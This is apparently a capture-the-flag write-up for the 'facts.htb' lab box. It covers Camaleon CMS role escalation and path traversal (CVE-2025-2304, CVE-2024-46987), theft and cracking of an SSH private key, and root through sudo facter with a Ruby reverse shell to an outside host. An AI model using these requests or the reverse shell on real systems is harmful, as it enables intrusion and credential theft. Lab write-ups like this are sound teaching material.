Lets start by doing a port scan.

```bash
nmap -p- --min-rate=5000 10.129.5.114
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-12 16:20 -0400
Nmap scan report for 10.129.5.114
Host is up (0.032s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
54321/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.90 seconds
```

Ok so we have a website and ssh on it. The port 54321 is unknown so let's do a more specific scan on it.

```bash
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-12 16:22 -0400
Nmap scan report for 10.129.5.114
Host is up (0.032s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
54321/tcp open  http    Golang net/http server
|_http-server-header: MinIO
|_http-title: Site doesn't have a title (application/xml).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 189C31AE636A82FF
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Thu, 12 Mar 2026 20:22:58 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>189C31AE636A82FF</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 189C31AA8D34B3DF
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Thu, 12 Mar 2026 20:22:41 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>189C31AA8D34B3DF</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Thu, 12 Mar 2026 20:22:41 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.98%I=7%D=3/12%Time=69B32091%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nAc
SF:cept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x20app
SF:lication/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20max-a
SF:ge=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2:\x20
SF:dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r\nX-A
SF:mz-Request-Id:\x20189C31AA8D34B3DF\r\nX-Content-Type-Options:\x20nosnif
SF:f\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Thu,\x2012\x20Ma
SF:r\x202026\x2020:22:41\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20encod
SF:ing=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Invalid\x2
SF:0Request\x20\(invalid\x20argument\)</Message><Resource>/</Resource><Req
SF:uestId>189C31AA8D34B3DF</RequestId><HostId>dd9025bab4ad464b049177c95eb6
SF:ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOptions,5
SF:9,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Thu,\x2012\x20
SF:Mar\x202026\x2020:22:41\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSP
SF:Request,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,2CB,"HTTP/1\.0\x2
SF:0400\x20Bad\x20Request\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x2
SF:0303\r\nContent-Type:\x20application/xml\r\nServer:\x20MinIO\r\nStrict-
SF:Transport-Security:\x20max-age=31536000;\x20includeSubDomains\r\nVary:\
SF:x20Origin\r\nX-Amz-Id-2:\x20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af
SF:9251148b658df7ac2e3e8\r\nX-Amz-Request-Id:\x20189C31AE636A82FF\r\nX-Con
SF:tent-Type-Options:\x20nosniff\r\nX-Xss-Protection:\x201;\x20mode=block\
SF:r\nDate:\x20Thu,\x2012\x20Mar\x202026\x2020:22:58\x20GMT\r\n\r\n<\?xml\
SF:x20version=\"1\.0\"\x20encoding=\"UTF-8\"\?>\n<Error><Code>InvalidReque
SF:st</Code><Message>Invalid\x20Request\x20\(invalid\x20argument\)</Messag
SF:e><Resource>/nice\x20ports,/Trinity\.txt\.bak</Resource><RequestId>189C
SF:31AE636A82FF</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3f
SF:d1af9251148b658df7ac2e3e8</HostId></Error>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.79 seconds
```


Ok so it was a website with a bunch on random stuff attached to it. Lets visit the sites.
Before that I added facts.htb to the /etc/hosts file.


I went through the entire website and I found an admin panel. It had an possibility to create and account there. 

The admin panel doesn't have any functionality which is sad. But here we can see that it's running Camaleon CMS and the version is 2.9.0 Let's see if there is a CVE for this one.

Ok so there was an priviledge escalation that we were able to change our role to an admin when changing our password. 

```bash
_method=patch&authenticity_token=h5NfeLWp4bhLzBNS2LNTRiiHdPB3xhOLBhIdX8rKSNndRlFJvwRrB2crqsFg3k4iax4Tm-vhl7rRHAnFC-TD6A&password[password]=a&password[password_confirmation]=a&password[role]=admin
```
https://www.wiz.io/vulnerability-database/cve/cve-2025-2304


Now that we are an admin we have access to plugins and such. 

CVE-2024-46987

There is a path travelsal exploit on the media part of the website.

```bash
http://facts.htb/admin/media/download_private_file?file=../../../../../../../etc/passwd
```
The following lets us download the /etc/passwd file


Since the machine was just rated "easy"
I decided to look for the home folders of the accounts found in /passwd
"william", "_laurel" and "trivia"


I was correct.

```bash
GET /admin/media/download_private_file?file=../../../../../../../../home/william/user.txt 



HTTP/1.1 200 OK
Server: nginx/1.26.3 (Ubuntu)
Date: Thu, 12 Mar 2026 23:00:36 GMT
Content-Type: text/plain
Content-Length: 33
Connection: keep-alive
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
content-disposition: inline; filename="user.txt"; filename*=UTF-8''user.txt
content-transfer-encoding: binary
cache-control: no-cache
x-request-id: 802fc91b-3372-4bb6-a0ce-cbf4c0d3eea9
x-runtime: 0.099824


74048###5d736e862d900ce1b62af8a

```
I tried to get williams ssh key but i was unable to.
Let's try to other ones

```bash
HTTP/1.1 200 OK
Server: nginx/1.26.3 (Ubuntu)
Date: Thu, 12 Mar 2026 23:10:23 GMT
Content-Type: application/octet-stream
Content-Length: 464
Connection: keep-alive
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
content-disposition: inline; filename="id_ed25519"; filename*=UTF-8''id_ed25519
content-transfer-encoding: binary
cache-control: no-cache
x-request-id: 6783e9d5-6b4b-4e82-8d44-efb0c5bcfb72
x-runtime: 0.027582

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAk4NhOC3
yiWiiI13SbbfITAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIFcQEO7y4vTvpP7B
zLNCbAV5epEWGwCcZWAzpnfI0qm9AAAAoPlL1FB2wwqlUFpGUz7Gy56VzhOE+VzveUcuG4
RG8UX7k4XZ3tP+8a0SV8tOoR5FrgaBsX68JQhSOasDGozFcO9eFnmu6yNixrCjKbSNtj7I
GK+wy0ph/5DJN/mVEPjsTh9t20HaCxEwQBzdpDjEYYQAYoQrXpLTBintY3lmFxDifeioPC
4LDUuMc5MAuC7A5v19CbG3cYFcfTBSLvI/17M=
-----END OPENSSH PRIVATE KEY-----

```

Ok this is good news. I copied it and put it on the attacking machine.
I had to crack the passphrase with john the ripper
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash


john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (id_rsa)     
1g 0:00:02:01 DONE (2026-03-12 19:17) 0.008204g/s 26.25p/s 26.25c/s 26.25C/s grecia..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Now we are able to log in.

```bash
sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```
We are able to run facter as sudo. Let's check gtfobins for privesc methods and such

Facter is a tool that just shows info about the machine pretty much.
I read the manual and it said that its going to execute the first ruby file in the --custom-dir path i give. So i just gave it my own path and created a exploit.rb which had a reverse shell in it. 

```bash
cat exploit.rb 
exec("bash -c 'bash -i >& /dev/tcp/10.10.15.242/6666 0>&1'")

connect to [10.10.15.242] from (UNKNOWN) [10.129.5.114] 44728
root@facts:/home/trivia# ls
ls
exploit.rb
root@facts:/home/trivia# cd 
cd
root@facts:~# cat root
cat root.txt 
9d96f1c1d09f30b1ee3c702b94fad99b
```

Fun machine for sure.


